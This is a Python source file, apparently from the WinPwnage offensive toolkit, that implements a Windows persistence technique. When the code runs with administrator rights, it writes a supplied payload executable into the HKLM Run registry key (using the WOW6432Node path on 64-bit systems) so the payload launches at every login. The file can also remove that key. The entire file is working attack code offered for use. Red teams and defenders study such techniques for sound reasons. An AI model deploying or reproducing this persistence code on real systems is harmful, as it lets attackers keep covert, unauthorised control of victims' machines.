from winpwnage.core.prints import *
from winpwnage.core.utils import *

persistMethod6_info = {
	"Description": "Persistence using HKLM run key",
	"Method": "Registry key (HKLM Run) manipulation",
	"Id": "6",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persistMethod6",
	"Function Payload": True,
}

def persistMethod6(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if "64" in information().architecture():
		kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
	else:
		kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

	if add:
		if payloads().exe(payload):
			if registry().modify_key(hkey="hklm", path=kpath, name=name, value=payloads().exe(payload)[1]):
				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payloads().exe(payload)[1]))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to install persistence")
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hklm", path=kpath, name=name):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False
